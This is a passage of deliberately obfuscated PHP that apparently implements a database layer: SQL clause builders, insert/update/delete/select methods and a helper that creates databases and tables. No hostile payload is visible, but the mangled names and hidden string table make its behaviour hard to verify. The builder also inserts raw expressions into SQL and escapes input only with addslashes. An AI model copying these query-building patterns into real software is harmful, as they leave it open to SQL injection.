-strlen($D”ìò¼á§¼)); } return empty($aÉ”„…º¾º) ? $eï„åµ»«õ[33] : $eï„åµ»«õ[946] . $aÉ”„…º¾º; } protected function parseWhereItem($b†‡šºÄ±, $a½¡çÒ’àŒ) { $D¶»‹²óæÏ =& $_SERVER[òÀöí]; $BÓ˜òœ‹„Æ = $D¶»‹²óæÏ[33]; if (is_array($a½¡çÒ’àŒ)) { if (is_string($a½¡çÒ’àŒ[0])) { $eäõÁÍÑƒ = strtolower($a½¡çÒ’àŒ[0]); if (in_array($a½¡çÒ’àŒ[0], array($D¶»‹²óæÏ[930], $D¶»‹²óæÏ[947], $D¶»‹²óæÏ[948], $D¶»‹²óæÏ[949], $D¶»‹²óæÏ[950], $D¶»‹²óæÏ[951]))) { $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $a½¡çÒ’àŒ[0] . $D¶»‹²óæÏ[50] . $this->parseValue($a½¡çÒ’àŒ[1]); } elseif (preg_match($D¶»‹²óæÏ[952], $a½¡çÒ’àŒ[0])) { $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[50] . $this->parseValue($a½¡çÒ’àŒ[1]); } elseif (preg_match($D¶»‹²óæÏ[953], $a½¡çÒ’àŒ[0])) { if (is_array($a½¡çÒ’àŒ[1])) { $d‹»‡–ğà‡ = isset($a½¡çÒ’àŒ[2]) ? strtoupper($a½¡çÒ’àŒ[2]) : $D¶»‹²óæÏ[938]; if (in_array($d‹»‡–ğà‡, array($D¶»‹²óæÏ[937], $D¶»‹²óæÏ[938], $D¶»‹²óæÏ[939]))) { $F°ë¸àŒá® = array(); foreach ($a½¡çÒ’àŒ[1] as $EÜ‚½ˆåæì) { $F°ë¸àŒá®[] = $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[50] . $this->parseValue($EÜ‚½ˆåæì); } $BÓ˜òœ‹„Æ .= $D¶»‹²óæÏ[256] . implode($D¶»‹²óæÏ[50] . $d‹»‡–ğà‡ . $D¶»‹²óæÏ[50], $F°ë¸àŒá®) . $D¶»‹²óæÏ[844]; } } else { $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[50] . $this->parseValue($a½¡çÒ’àŒ[1]); } } elseif ($D¶»‹²óæÏ[293] == $eäõÁÍÑƒ) { $BÓ˜òœ‹„Æ .= $D¶»‹²óæÏ[842] . $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $a½¡çÒ’àŒ[1] . $D¶»‹²óæÏ[954]; } elseif (preg_match($D¶»‹²óæÏ[955], $a½¡çÒ’àŒ[0])) { $BÓ˜òœ‹„Æ .= $a½¡çÒ’àŒ[0]; } elseif (preg_match($D¶»‹²óæÏ[956], $a½¡çÒ’àŒ[0])) { if (isset($a½¡çÒ’àŒ[2]) && $D¶»‹²óæÏ[293] == $a½¡çÒ’àŒ[2]) { $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[50] . $a½¡çÒ’àŒ[1]; } else { if (is_string($a½¡çÒ’àŒ[1])) { $a½¡çÒ’àŒ[1] = explode($D¶»‹²óæÏ[47], $a½¡çÒ’àŒ[1]); } $FºƒÊÖŠ†ª = implode($D¶»‹²óæÏ[47], $this->parseValue($a½¡çÒ’àŒ[1])); $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[842] . $FºƒÊÖŠ†ª . $D¶»‹²óæÏ[844]; } } elseif (preg_match($D¶»‹²óæÏ[957], $a½¡çÒ’àŒ[0])) { $b­‰¼ëßóğ = is_string($a½¡çÒ’àŒ[1]) ? explode($D¶»‹²óæÏ[47], $a½¡çÒ’àŒ[1]) : $a½¡çÒ’àŒ[1]; $BÓ˜òœ‹„Æ .= $D¶»‹²óæÏ[842] . $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $this->exp[$eäõÁÍÑƒ] . $D¶»‹²óæÏ[50] . $this->parseValue($b­‰¼ëßóğ[0]) . $D¶»‹²óæÏ[940] . $this->parseValue($b­‰¼ëßóğ[1]) . $D¶»‹²óæÏ[274]; } else { think_exception(think_lang($D¶»‹²óæÏ[943]) . $D¶»‹²óæÏ[4] . $a½¡çÒ’àŒ[0]); } } else { $FÉŠôÛß¸ˆ = count($a½¡çÒ’àŒ); $b¤ÏêÂÖˆ = $D¶»‹²óæÏ[33]; if (is_string($a½¡çÒ’àŒ[$FÉŠôÛß¸ˆ - 1])) { $b¤ÏêÂÖˆ = isset($a½¡çÒ’àŒ[$FÉŠôÛß¸ˆ - 1]) ? strtoupper($a½¡çÒ’àŒ[$FÉŠôÛß¸ˆ - 1]) : $D¶»‹²óæÏ[33]; if (in_array($b¤ÏêÂÖˆ, array($D¶»‹²óæÏ[937], $D¶»‹²óæÏ[938], $D¶»‹²óæÏ[939]))) { $FÉŠôÛß¸ˆ = $FÉŠôÛß¸ˆ - 1; } } else { $b¤ÏêÂÖˆ = $D¶»‹²óæÏ[937]; } for ($eÅâí©ñºŸ = 0; $eÅâí©ñºŸ < $FÉŠôÛß¸ˆ; $eÅâí©ñºŸ++) { $b­‰¼ëßóğ = is_array($a½¡çÒ’àŒ[$eÅâí©ñºŸ]) ? $a½¡çÒ’àŒ[$eÅâí©ñºŸ][1] : $a½¡çÒ’àŒ[$eÅâí©ñºŸ]; if ($D¶»‹²óæÏ[293] == strtolower($a½¡çÒ’àŒ[$eÅâí©ñºŸ][0])) { $BÓ˜òœ‹„Æ .= $D¶»‹²óæÏ[256] . $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $b­‰¼ëßóğ . $D¶»‹²óæÏ[954] . $b¤ÏêÂÖˆ . $D¶»‹²óæÏ[50]; } else { $Cİƒ®¡¿Ò = is_array($a½¡çÒ’àŒ[$eÅâí©ñºŸ]) ? $this->exp[strtolower($a½¡çÒ’àŒ[$eÅâí©ñºŸ][0])] : $D¶»‹²óæÏ[930]; if (!$Cİƒ®¡¿Ò && is_array($a½¡çÒ’àŒ[$eÅâí©ñºŸ]) && in_array($a½¡çÒ’àŒ[$eÅâí©ñºŸ][0], array($D¶»‹²óæÏ[930], $D¶»‹²óæÏ[947], $D¶»‹²óæÏ[948], $D¶»‹²óæÏ[949], $D¶»‹²óæÏ[950], $D¶»‹²óæÏ[951]))) { $Cİƒ®¡¿Ò = $a½¡çÒ’àŒ[$eÅâí©ñºŸ][0]; } $BÓ˜òœ‹„Æ .= $D¶»‹²óæÏ[256] . $b†‡šºÄ± . $D¶»‹²óæÏ[50] . $Cİƒ®¡¿Ò . $D¶»‹²óæÏ[50] . $this->parseValue($b­‰¼ëßóğ) . $D¶»‹²óæÏ[954] . $b¤ÏêÂÖˆ . $D¶»‹²óæÏ[50]; } } $BÓ˜òœ‹„Æ = substr($BÓ˜òœ‹„Æ, 0, -4); } } else { $BÓ˜òœ‹„Æ .= $b†‡šºÄ± . $D¶»‹²óæÏ[958] . $this->parseValue($a½¡çÒ’àŒ); } return $BÓ˜òœ‹„Æ; } protected function parseThinkWhere($BÍë› ‹Åó, $C’¦„ŠÎ•Ó) { $FŒªÌÜ¾á¼ =& $_SERVER[òÀöí]; $D²„Æ•…Ò = $FŒªÌÜ¾á¼[33]; switch ($BÍë› ‹Åó) { case $FŒªÌÜ¾á¼[348]: $D²„Æ•…Ò = $C’¦„ŠÎ•Ó; break; case $FŒªÌÜ¾á¼[941]: $D²„Æ•…Ò = is_string($C’¦„ŠÎ•Ó) ? $C’¦„ŠÎ•Ó : substr($this->parseWhere($C’¦„ŠÎ•Ó), 6); break; case $FŒªÌÜ¾á¼[959]: parse_str($C’¦„ŠÎ•Ó, $EöÒÀœ¯ˆ›); if (isset($EöÒÀœ¯ˆ›[$FŒªÌÜ¾á¼[936]])) { $F‘Ç©¯‘Õ© = $FŒªÌÜ¾á¼[50] . strtoupper($EöÒÀœ¯ˆ›[$FŒªÌÜ¾á¼[936]]) . $FŒªÌÜ¾á¼[50]; unset($EöÒÀœ¯ˆ›[$FŒªÌÜ¾á¼[936]]); } else { $F‘Ç©¯‘Õ© = $FŒªÌÜ¾á¼[940]; } $FÔŠ‘–èé  = array(); foreach ($EöÒÀœ¯ˆ› as $aŞî¨¸à => $BŞÙŠÉ„–) { $FÔŠ‘–èé [] = $this->parseKey($aŞî¨¸à) . $FŒªÌÜ¾á¼[958] . $this->parseValue($BŞÙŠÉ„–); } $D²„Æ•…Ò = implode($F‘Ç©¯‘Õ©, $FÔŠ‘–èé ); break; } return $D²„Æ•…Ò; } protected function parseLimit($Dø“ØñµÔ¡) { $fî²Ø½ëÚñ =& $_SERVER[òÀöí]; return !empty($Dø“ØñµÔ¡) ? $fî²Ø½ëÚñ[48] . $Dø“ØñµÔ¡ . $fî²Ø½ëÚñ[50] : $fî²Ø½ëÚñ[33]; } protected function parseJoin($A¡¦¹…æÑ®) { $C‚Âî¯±¾µ =& $_SERVER[òÀöí]; $D¿§àÄµ°ğ = $C‚Âî¯±¾µ[33]; if (!empty($A¡¦¹…æÑ®)) { if (is_array($A¡¦¹…æÑ®)) { foreach ($A¡¦¹…æÑ® as $eäŠ¤Åë° => $aÆÑ‰×½§È) { if (!1 !== stripos($aÆÑ‰×½§È, $C‚Âî¯±¾µ[960])) { $D¿§àÄµ°ğ .= $C‚Âî¯±¾µ[50] . $aÆÑ‰×½§È; } else { $D¿§àÄµ°ğ .= $C‚Âî¯±¾µ[961] . $aÆÑ‰×½§È; } } } else { $D¿§àÄµ°ğ .= $C‚Âî¯±¾µ[961] . $A¡¦¹…æÑ®; } } $D¿§àÄµ°ğ = preg_replace($C‚Âî¯±¾µ[962], think_config($C‚Âî¯±¾µ[868]) . $C‚Âî¯±¾µ[963], $D¿§àÄµ°ğ); return $D¿§àÄµ°ğ; } protected function parseOrder($b¤ë÷æ¿µ¢) { $bµß“„å‰ =& $_SERVER[òÀöí]; if (is_array($b¤ë÷æ¿µ¢)) { $Dˆ›Û‡ÁÑ = array(); foreach ($b¤ë÷æ¿µ¢ as $d•ƒ»ÇŒ¦² => $B«äß§ÙÔª) { if (is_numeric($d•ƒ»ÇŒ¦²)) { $Dˆ›Û‡ÁÑ[] = $this->parseKey($B«äß§ÙÔª); } else { $B«äß§ÙÔª = in_array(strtoupper(trim($B«äß§ÙÔª)), array($bµß“„å‰[964], $bµß“„å‰[965])) ? $bµß“„å‰[50] . $B«äß§ÙÔª : $bµß“„å‰[33]; if (preg_match($bµß“„å‰[966], $d•ƒ»ÇŒ¦²)) { $Dˆ›Û‡ÁÑ[] = $this->parseKey($d•ƒ»ÇŒ¦²) . $B«äß§ÙÔª; } else { think_exception($bµß“„å‰[967] . $d•ƒ»ÇŒ¦²); } } } $b¤ë÷æ¿µ¢ = implode($bµß“„å‰[47], $Dˆ›Û‡ÁÑ); } return !empty($b¤ë÷æ¿µ¢) ? $bµß“„å‰[968] . $b¤ë÷æ¿µ¢ : $bµß“„å‰[33]; } protected function parseGroup($c›Çá÷çŠ) { $Bœàè¢¦¹Ù =& $_SERVER[òÀöí]; return !empty($c›Çá÷çŠ) ? $Bœàè¢¦¹Ù[969] . $c›Çá÷çŠ : $Bœàè¢¦¹Ù[33]; } protected function parseHaving($c²³‹…ˆÌ„) { $dÊ÷ÌÙ ’ =& $_SERVER[òÀöí]; return !empty($c²³‹…ˆÌ„) ? $dÊ÷ÌÙ ’[970] . $c²³‹…ˆÌ„ : $dÊ÷ÌÙ ’[33]; } protected function parseComment($C’ƒŠ†¼º›) { $a‹Ì´İÏÒ» =& $_SERVER[òÀöí]; return !empty($C’ƒŠ†¼º›) ? $a‹Ì´İÏÒ»[971] . $C’ƒŠ†¼º› . $a‹Ì´İÏÒ»[972] : $a‹Ì´İÏÒ»[33]; } protected function parseDistinct($DøËå­¥È•) { $aÊØÜª©¯ =& $_SERVER[òÀöí]; return !empty($DøËå­¥È•) ? $aÊØÜª©¯[973] : $aÊØÜª©¯[33]; } protected function parseUnion($DÎ‘ÓÑ†–Ç) { $C¶íÜÈ¨å =& $_SERVER[òÀöí]; if (empty($DÎ‘ÓÑ†–Ç)) { return $C¶íÜÈ¨å[33]; } if (isset($DÎ‘ÓÑ†–Ç[$C¶íÜÈ¨å[344]])) { $Fœ¯ãÚ±óÃ = $C¶íÜÈ¨å[974]; unset($DÎ‘ÓÑ†–Ç[$C¶íÜÈ¨å[344]]); } else { $Fœ¯ãÚ±óÃ = $C¶íÜÈ¨å[975]; } foreach ($DÎ‘ÓÑ†–Ç as $aİçÖé‹×ä) { $bå‰Š¶‹Ç[] = $Fœ¯ãÚ±óÃ . (is_array($aİçÖé‹×ä) ? $this->buildSelectSql($aİçÖé‹×ä) : $aİçÖé‹×ä); } return implode($C¶íÜÈ¨å[50], $bå‰Š¶‹Ç); } public function insert($DŠåÍÊìâò, $AÈ„¡Ş½È¯ = array(), $aôÅàÛÄÍˆ = false) { goto FÙ±ï‘ÀæÑ; Aæ¼äÖß†ó: foreach ($DŠåÍÊìâò as $aÙš‰«‘™´ => $CŠâ‡„Ê«‡) { if (is_array($CŠâ‡„Ê«‡) && $D„‡äÆÔÎ‡[293] == $CŠâ‡„Ê«‡[0]) { $Dà÷ •ï¬ã[] = $this->parseKey($aÙš‰«‘™´); $B§•÷‹Š[] = $CŠâ‡„Ê«‡[1]; } elseif (is_scalar($CŠâ‡„Ê«‡) || is_null($CŠâ‡„Ê«‡)) { $Dà÷ •ï¬ã[] = $this->parseKey($aÙš‰«‘™´); $B§•÷‹Š[] = $this->parseValue($CŠâ‡„Ê«‡); } } $d×²”ª³ø¸ = ($aôÅàÛÄÍˆ ? $D„‡äÆÔÎ‡[846] : $D„‡äÆÔÎ‡[847]) . $D„‡äÆÔÎ‡[848] . $this->parseTable($AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[275]]) . $D„‡äÆÔÎ‡[842] . implode($D„‡äÆÔÎ‡[47], $Dà÷ •ï¬ã) . $D„‡äÆÔÎ‡[843] . implode($D„‡äÆÔÎ‡[47], $B§•÷‹Š) . $D„‡äÆÔÎ‡[844]; $d×²”ª³ø¸ .= $this->parseLock(isset($AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[800]]) ? $AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[800]] : !1); goto bìÕ¶®Âƒâ; bìÕ¶®Âƒâ: $d×²”ª³ø¸ .= $this->parseComment(!empty($AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[350]]) ? $AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[350]] : $D„‡äÆÔÎ‡[33]); return $this->execute($d×²”ª³ø¸, $this->parseBind(!empty($AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[281]]) ? $AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[281]] : array())); goto e÷˜æ‰¾÷; FÙ±ï‘ÀæÑ: $D„‡äÆÔÎ‡ =& $_SERVER[òÀöí]; $B§•÷‹Š = $Dà÷ •ï¬ã = array(); $this->model = $AÈ„¡Ş½È¯[$D„‡äÆÔÎ‡[277]]; goto Aæ¼äÖß†ó; e÷˜æ‰¾÷: } public function selectInsert($eºÖ„£¥†¿, $Eç”ÇŠ¤’ã, $CÏÕÈŸ™ÍË = array()) { goto eÂ°†å×Ü³; E×›ÃÖ¥ßÕ: return $this->execute($b³İ”½»¥£, $this->parseBind(!empty($CÏÕÈŸ™ÍË[$AÄÇöä¹ò[281]]) ? $CÏÕÈŸ™ÍË[$AÄÇöä¹ò[281]] : array())); goto D¯ê¾šÙ½¸; d¬êÇĞ¬òá: array_walk($eºÖ„£¥†¿, array($this, $AÄÇöä¹ò[845])); $b³İ”½»¥£ = $AÄÇöä¹ò[976] . $this->parseTable($Eç”ÇŠ¤’ã) . $AÄÇöä¹ò[842] . implode($AÄÇöä¹ò[47], $eºÖ„£¥†¿) . $AÄÇöä¹ò[954]; $b³İ”½»¥£ .= $this->buildSelectSql($CÏÕÈŸ™ÍË); goto E×›ÃÖ¥ßÕ; eÂ°†å×Ü³: $AÄÇöä¹ò =& $_SERVER[òÀöí]; $this->model = $CÏÕÈŸ™ÍË[$AÄÇöä¹ò[277]]; if (is_string($eºÖ„£¥†¿)) { $eºÖ„£¥†¿ = explode($AÄÇöä¹ò[47], $eºÖ„£¥†¿); } goto d¬êÇĞ¬òá; D¯ê¾šÙ½¸: } public function update($BÈØÅ©‘, $DÅîè‹ÕÖÍ) { $F¦ªå–™Ö =& $_SERVER[òÀöí]; $this->model = $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[277]]; $CÚ¨öÀôÉÄ = $F¦ªå–™Ö[977] . $this->parseTable($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[275]]) . $this->parseSet($BÈØÅ©‘) . $this->parseWhere(!empty($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[271]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[271]] : $F¦ªå–™Ö[33]) . $this->parseOrder(!empty($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[359]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[359]] : $F¦ªå–™Ö[33]) . $this->parseLimit(!empty($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[288]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[288]] : $F¦ªå–™Ö[33]) . $this->parseLock(isset($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[800]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[800]] : !1) . $this->parseComment(!empty($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[350]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[350]] : $F¦ªå–™Ö[33]); return $this->execute($CÚ¨öÀôÉÄ, $this->parseBind(!empty($DÅîè‹ÕÖÍ[$F¦ªå–™Ö[281]]) ? $DÅîè‹ÕÖÍ[$F¦ªå–™Ö[281]] : array())); } public function delete($fÊÓ¬¢·šÑ = array()) { $a³‘ °¡Õì =& $_SERVER[òÀöí]; $this->model = $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[277]]; $FÔ½ë­çÃ = $a³‘ °¡Õì[978] . $this->parseTable($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[275]]) . $this->parseWhere(!empty($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[271]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[271]] : $a³‘ °¡Õì[33]) . $this->parseOrder(!empty($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[359]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[359]] : $a³‘ °¡Õì[33]) . $this->parseLimit(!empty($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[288]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[288]] : $a³‘ °¡Õì[33]) . $this->parseLock(isset($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[800]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[800]] : !1) . $this->parseComment(!empty($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[350]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[350]] : $a³‘ °¡Õì[33]); return $this->execute($FÔ½ë­çÃ, $this->parseBind(!empty($fÊÓ¬¢·šÑ[$a³‘ °¡Õì[281]]) ? $fÊÓ¬¢·šÑ[$a³‘ °¡Õì[281]] : array())); } public function select($b„³„åî­‚ = array()) { goto F¹ñå¸µ†ä; C»Îğ«¦”é: $A¨·¦ŠíÕ = isset($b„³„åî­‚[$AùÉ³‘ô§˜[345]]) ? $b„³„åî­‚[$AùÉ³‘ô§˜[345]] : !1; if ($A¨·¦ŠíÕ) { $c–Ã¶îŒ¯Ì = is_string($A¨·¦ŠíÕ[$AùÉ³‘ô§˜[92]]) ? $A¨·¦ŠíÕ[$AùÉ³‘ô§˜[92]] : $AùÉ³‘ô§˜[979] . md5($dÏ³Ó®ˆ¯š); $a”ÃĞ»°…ò = think_cache($c–Ã¶îŒ¯Ì, $AùÉ³‘ô§˜[33], $A¨·¦ŠíÕ); if (!1 !== $a”ÃĞ»°…ò) { return $a”ÃĞ»°…ò; } } $fõÕ¤’óğÊ = $this->query($dÏ³Ó®ˆ¯š, $this->parseBind(!empty($b„³„åî­‚[$AùÉ³‘ô§˜[281]]) ? $b„³„åî­‚[$AùÉ³‘ô§˜[281]] : array())); goto C¿øòÌ½š„; F¹ñå¸µ†ä: $AùÉ³‘ô§˜ =& $_SERVER[òÀöí]; $this->model = $b„³„åî­‚[$AùÉ³‘ô§˜[277]]; $dÏ³Ó®ˆ¯š = $this->buildSelectSql($b„³„åî­‚); goto C»Îğ«¦”é; C¿øòÌ½š„: if ($A¨·¦ŠíÕ && !1 !== $fõÕ¤’óğÊ) { think_cache($c–Ã¶îŒ¯Ì, $fõÕ¤’óğÊ, $A¨·¦ŠíÕ); } return $fõÕ¤’óğÊ; goto cÃ‚š…Äæ; cÃ‚š…Äæ: } public function buildSelectSql($d’¸¼Õï = array()) { goto d”õâ·Ï; Fª—˜ïøäã: $C¨Ñã±Ã—½ = $this->parseSql($this->selectSql, $d’¸¼Õï); $C¨Ñã±Ã—½ .= $this->parseLock(isset($d’¸¼Õï[$c‹È¢‘ß‰[800]]) ? $d’¸¼Õï[$c‹È¢‘ß‰[800]] : !1); if (isset($cğŸœ³ÇœÍ)) { think_cache($cğŸœ³ÇœÍ, $C¨Ñã±Ã—½); } goto Cñ‰ñù˜Ó«; d”õâ·Ï: $c‹È¢‘ß‰ =& $_SERVER[òÀöí]; if (isset($d’¸¼Õï[$c‹È¢‘ß‰[349]])) { if (strpos($d’¸¼Õï[$c‹È¢‘ß‰[349]], $c‹È¢‘ß‰[47])) { list($A«Ï“ˆ·¼, $d§«øã ¤š) = explode($c‹È¢‘ß‰[47], $d’¸¼Õï[$c‹È¢‘ß‰[349]]); } else { $A«Ï“ˆ·¼ = $d’¸¼Õï[$c‹È¢‘ß‰[349]]; } $A«Ï“ˆ·¼ = $A«Ï“ˆ·¼ ? $A«Ï“ˆ·¼ : 1; $d§«øã ¤š = isset($d§«øã ¤š) ? $d§«øã ¤š : (is_numeric($d’¸¼Õï[$c‹È¢‘ß‰[288]]) ? $d’¸¼Õï[$c‹È¢‘ß‰[288]] : 20); $a‚×‘äÔ°ƒ = $d§«øã ¤š * ((int) $A«Ï“ˆ·¼ - 1); $d’¸¼Õï[$c‹È¢‘ß‰[288]] = $a‚×‘äÔ°ƒ . $c‹È¢‘ß‰[47] . $d§«øã ¤š; } if (think_config($c‹È¢‘ß‰[980])) { $cğŸœ³ÇœÍ = $c‹È¢‘ß‰[981] . md5(serialize($d’¸¼Õï)); $FõÃÔ—æ· = think_cache($cğŸœ³ÇœÍ); if ($FõÃÔ—æ·) { return $FõÃÔ—æ·; } } goto Fª—˜ïøäã; Cñ‰ñù˜Ó«: return $C¨Ñã±Ã—½; goto e‚Ôî­ìˆ·; e‚Ôî­ìˆ·: } public function parseSql($F©ø¥Ì¥Ú, $aì£‚Ï¿‹ = array()) { $cÃŒ®—”» =& $_SERVER[òÀöí]; $F©ø¥Ì¥Ú = str_replace(array($cÃŒ®—”»[982], $cÃŒ®—”»[983], $cÃŒ®—”»[984], $cÃŒ®—”»[985], $cÃŒ®—”»[986], $cÃŒ®—”»[987], $cÃŒ®—”»[988], $cÃŒ®—”»[989], $cÃŒ®—”»[990], $cÃŒ®—”»[991], $cÃŒ®—”»[992]), array($this->parseTable("{$aì£‚Ï¿‹[$cÃŒ®—”»[275]]}"), $this->parseDistinct(isset($aì£‚Ï¿‹[$cÃŒ®—”»[993]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[993]] : !1), $this->parseField(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[269]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[269]] : $cÃŒ®—”»[182]), $this->parseJoin(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[278]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[278]] : $cÃŒ®—”»[33]), $this->parseWhere(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[271]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[271]] : $cÃŒ®—”»[33]), $this->parseGroup(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[994]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[994]] : $cÃŒ®—”»[33]), $this->parseHaving(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[995]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[995]] : $cÃŒ®—”»[33]), $this->parseOrder(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[359]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[359]] : $cÃŒ®—”»[33]), $this->parseLimit(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[288]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[288]] : $cÃŒ®—”»[33]), $this->parseUnion(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[343]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[343]] : $cÃŒ®—”»[33]), $this->parseComment(!empty($aì£‚Ï¿‹[$cÃŒ®—”»[350]]) ? $aì£‚Ï¿‹[$cÃŒ®—”»[350]] : $cÃŒ®—”»[33])), $F©ø¥Ì¥Ú); return $F©ø¥Ì¥Ú; } public function getLastSql($bÜœÛÈ„ = '') { return $bÜœÛÈ„ ? $this->modelSql[$bÜœÛÈ„] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($A¶éÓ’Ò”¥) { return addslashes($A¶éÓ’Ò”¥); } public function setModel($DŞªÆÄ‰ãŞ) { $this->model = $DŞªÆÄ‰ãŞ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($fº“Ùá‰í, $d‡ ƒÈˆç  = '') { $this->database = $fº“Ùá‰í; $this->type = $d‡ ƒÈˆç ; } public function model($A‰Ûê˜±ŞÄ = '') { return new ModelBase($A‰Ûê˜±ŞÄ, $_SERVER[òÀöí][33], $this->database); } public function db($cœÆ´–á¡ê = false) { goto cÛ˜îÁî†ç; A…öèÛØÀÈ: $this->database = $AÌ„è‡ÙÔ; $DêëÊéïß˜->execute("\x75\163\x65\x20\x60{$EãÔÂÉÜ‚œ}\x60"); return $DêëÊéïß˜; goto dÉ†¨ô˜¬´; cÛ˜îÁî†ç: $Cè†ĞÁï•õ =& $_SERVER[òÀöí]; $AÌ„è‡ÙÔ = array_change_key_case($this->database); if ($this->type == $Cè†ĞÁï•õ[9] || !$cœÆ´–á¡ê) { return $this->model()->db(); } goto BÀï©¹šÉ; BÀï©¹šÉ: $EãÔÂÉÜ‚œ = $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[908]]; $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[908]] = $Cè†ĞÁï•õ[33]; if ($AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[741]] == $Cè†ĞÁï•õ[742]) { $AÉ—Ä…‚®¾ = $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[743]]; $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[743]] = substr($AÉ—Ä…‚®¾, 0, strrpos($AÉ—Ä…‚®¾, $Cè†ĞÁï•õ[996])); } goto dÅƒé¡‰§¿; dÅƒé¡‰§¿: $this->database = $AÌ„è‡ÙÔ; $DêëÊéïß˜ = $this->model()->db(); try { $EÕîµ„Ê…‡ = $DêëÊéïß˜->execute("\163\150\x6f\167\40\144\141\x74\141\142\x61\x73\x65\163\40\154\151\153\x65\40\x27{$EãÔÂÉÜ‚œ}\x27"); } catch (Exception $c«¯Òó‡à) { } goto d°‚Î™ï×Î; d°‚Î™ï×Î: if (!$EÕîµ„Ê…‡) { $DêëÊéïß˜->execute("\143\162\x65\x61\x74\145\40\x64\141\164\x61\x62\141\x73\x65\x20\x60{$EãÔÂÉÜ‚œ}\x60"); } $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[908]] = $EãÔÂÉÜ‚œ; if ($AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[741]] == $Cè†ĞÁï•õ[742]) { $AÌ„è‡ÙÔ[$Cè†ĞÁï•õ[743]] .= $Cè†ĞÁï•õ[996] . $EãÔÂÉÜ‚œ; } goto A…öèÛØÀÈ; dÉ†¨ô˜¬´: } public function createTable($e²œìŠÂõ, $Cï–ù¶­ôÃ = null) { $c¼¶¨…ë¥Ú =& $_SERVER[òÀöí]; if (!IO::exist($e²œìŠÂõ)) { ActionCall($c¼¶¨…ë¥Ú[997], !0, 0); show_json(LNG($c¼¶¨…ë¥Ú[998]), !1); } $dß—ƒº’ïÆ = sqlSplit(IO::getContent($e²œìŠÂõ)); foreach ($dß—ƒº’ïÆ as $b¤½»À½Ü) { if ($Cï–ù¶­ôÃ) { $f¿öœòƒåä = stripos($b¤½»À½Ü, $c¼¶¨…ë¥Ú[999]) === 0; if ($f¿öœòƒåä) { $Cï–ù¶­ôÃ->task[$c¼¶¨…ë¥Ú[1000]] += 1; } } $this->model()->db()->execute($b¤½»À½Ü); if ($Cï–ù¶­ôÃ && $f¿öœòƒåä) { preg_match($c¼¶¨…ë¥Ú[1001], $b¤½»À½Ü, $Eãó±‡µÙ); $Cï–ù¶­ôÃ->task[$c¼¶¨…ë¥Ú[1002]] = $Eãó±‡µÙ[1]; 